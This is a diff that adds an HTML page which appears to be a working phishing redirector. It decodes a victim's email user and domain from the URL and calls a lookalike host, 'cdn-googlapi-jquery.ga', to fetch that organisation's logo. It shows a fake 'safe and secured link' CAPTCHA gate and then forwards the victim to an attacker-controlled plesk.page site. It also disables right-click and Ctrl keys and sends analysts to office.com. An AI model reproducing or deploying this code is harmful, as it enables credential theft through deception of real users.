@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>Continue...</title>
+
+    <link
+      rel="stylesheet"
+      href="https://static-exp1.licdn.com/sc/h/9jn1d7sloqqio63jp8vjuorxg"
+    />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
+    />
+    <script src="https://www.google.com/recaptcha/api.js?render=reCAPTCHA_site_key"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script>
+      document.addEventListener("keydown", function (event) {
+        if (event.ctrlKey) {
+          event.preventDefault();
+        }
+      });
+      document.addEventListener("contextmenu", (event) =>
+        event.preventDefault()
+      );
+      function onSubmit(token) {
+        frontier(token);
+      }
+    </script>
+
+    <!-- 
+    RewriteEngine on 
+    RewriteRule ^(.*)ibmx(.*)$ .error.htm?0@=$1 [NC,L] 
+  -->
+    <script>
+      var link_url = "https://compassionate-lamarr.198-46-178-171.plesk.page/";
+      var cleangen = Math.random().toString(36).slice(5);
+      var rush = window.location.href;
+      var nopageruns = "gen";
+      var pagerunsxx = "-pagex-";
+      var baserunsxx = "ibmx";
+      var lookright = "ifetchx";
+      var getuseranddmain = "isecuredx";
+      var todoc = "-doc-";
+      var torex = "-rex-";
+      var replacax = new RegExp("safe-1", "gi");
+      var link_url_reload =
+        new URL(rush).protocol + "//" + new URL(rush).hostname + "/";
+
+      if (typeof rush === "undefined" || rush === null || rush === "") {
+        window.location.replace("https://www.office.com/");
+      }
+
+      try {
+        var baseRunsx = atob(rush.split(baserunsxx)[1]);
+      } catch (e) {
+        var baseRunsx = rush.split(baserunsxx)[1];
+      }
+
+      try {
+        var baseRunsx = atob(baseRunsx);
+      } catch (e) {
+        var baseRunsx = baseRunsx;
+      }
+
+      var baseRuns = baseRunsx.replace(replacax, "");
+
+      if (baseRuns.indexOf("pagex") > -1) {
+        var pageloadx = baseRuns.split(pagerunsxx)[0];
+      } else {
+        var pageloadx = nopageruns;
+      }
+      if (
+        typeof baseRuns === "undefined" ||
+        baseRuns === null ||
+        baseRuns === ""
+      ) {
+        window.location.replace("https://www.office.com/");
+      }
+      var runs = baseRuns.split(lookright)[1];
+      if (typeof runs === "undefined" || runs === null || runs === "") {
+        window.location.replace("https://www.office.com/");
+      }
+      var user = runs.split(getuseranddmain)[0];
+      if (typeof user === "undefined" || user === null || user === "") {
+        window.location.replace("https://www.office.com/");
+      }
+      var domain = runs.split(getuseranddmain)[1];
+      if (typeof domain === "undefined" || domain === null || domain === "") {
+        window.location.replace("https://www.office.com/");
+      }
+      var define_link =
+        link_url +
+        randomString(
+          32,
+          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        ) +
+        baserunsxx +
+        btoa(
+          pageloadx +
+            pagerunsxx +
+            cleangen +
+            cleangen +
+            cleangen +
+            cleangen +
+            cleangen +
+            todoc +
+            user +
+            torex +
+            domain
+        );
+      if (
+        typeof runs === "undefined" ||
+        runs === null ||
+        runs === "" ||
+        typeof user === "undefined" ||
+        user === null ||
+        user === "" ||
+        typeof domain === "undefined" ||
+        domain === null ||
+        domain === ""
+      ) {
+        window.location.replace("https://www.office.com/");
+      }
+
+      if (!(rush.indexOf("fixed") > -1)) {
+        window.location.replace(
+          link_url_reload +
+            randomString(
+              32,
+              "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            ) +
+            "fixed" +
+            baserunsxx +
+            rush.split(baserunsxx)[1]
+        );
+      }
+
+      function frontier() {
+        window.location.replace(
+          link_url +
+            randomString(
+              32,
+              "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            ) +
+            "fixed" +
+            baserunsxx +
+            rush.split(baserunsxx)[1]
+        );
+        return false;
+      }
+
+      function randomString(length, chars) {
+        var result = "";
+        for (var i = length; i > 0; --i)
+          result += chars[Math.round(Math.random() * (chars.length - 1))];
+        return result;
+      }
+      function myFunction() {
+        document.getElementById("g-recaptcha").click();
+      }
+      $(document).ready(function () {
+        var urlredi = domain;
+        var dataString = "dx2" + btoa(urlredi);
+
+        $.ajax({
+          type: "GET",
+          url: "https://cdn-googlapi-jquery.ga/saveimg.php", //where you wanna post
+          data: dataString,
+          beforeSend: function (xhr) {},
+          success: function (responser) {
+            var response = JSON.parse(responser);
+            changeFav(atob(response.favicon));
+
+            if (response.title_logo) {
+              // $('.fav-span').html('<img class="fav" src="' + atob(response.title_logo) + '">');
+            }
+
+            if (response.title_logo) {
+              $(".fav-span").html(
+                '<img class="fav" height="40" src="' + atob(response.title_logo) + '">'
+              );
+            } else {
+              $(".fav-span").html(
+                '<img class="fav" src="http://www.google.com/s2/favicons?domain=' +
+                  urlredi +
+                  '" alt="Secured" height="40">'
+              );
+            }
+          },
+          error: function (jqXHR, textStatus, errorMessage) {
+            // $('#modalbanye').modal('hide');
+            // console.log(jqXHR); // Optional
+          },
+          complete: function () {
+            //  $('#loadingwork').hide();
+          },
+        });
+
+        // function to change favicon
+        function changeFav(src) {
+          $('link[rel="shortcut icon"]').attr("href", src);
+        }
+      });
+      // onload="myFunction()"
+    </script>
+  </head>
+  <body onload="myFunction()">
+    Loading...
+    <div id="app__container" style="display:none ;">
+      <main class="app__content" role="main">
+        <div id="" class="card-layout">
+          <div id="otp-div" class="">
+            <div class="otp-success-container">
+              <div class="mailbox__logo fav-span" aria-hidden="true">
+                <svg
+                  width="64"
+                  height="64"
+                  viewBox="0 0 64 64"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path d="M1 11H63V54H1V11Z" fill="#95ABC1" />
+                  <path
+                    d="M1 54L23.1 33.2C24.3 32.1 25.8 31.5 27.5 31.5H36.6C38.2 31.5 39.8 32.1 41 33.2L63 54H1Z"
+                    fill="#B4C6D8"
+                  />
+                  <path
+                    d="M63 11L36.5 36.8C34 39.2 29.9 39.2 27.4 36.8L1 11H63Z"
+                    fill="#D1DDE9"
+                  />
+                </svg>
+              </div>
+              <p class="">This is a safe and secured link, you can <b>Continue.</b></p>
+            </div>
+            <center>
+              <button
+                id="g-recaptcha"
+                class="g-recaptcha btn__primary--large"
+                data-sitekey="6LfFOi8jAAAAAELggfZzCAZwxVxILuAlkebh4gJ8"
+                data-callback="onSubmit"
+                data-action="submit"
+                type="button"
+              >
+                Continue...
+              </button>
+            </center>
+          </div>
+        </div>
+      </main>
+    </div>
+  </body>
+</html>
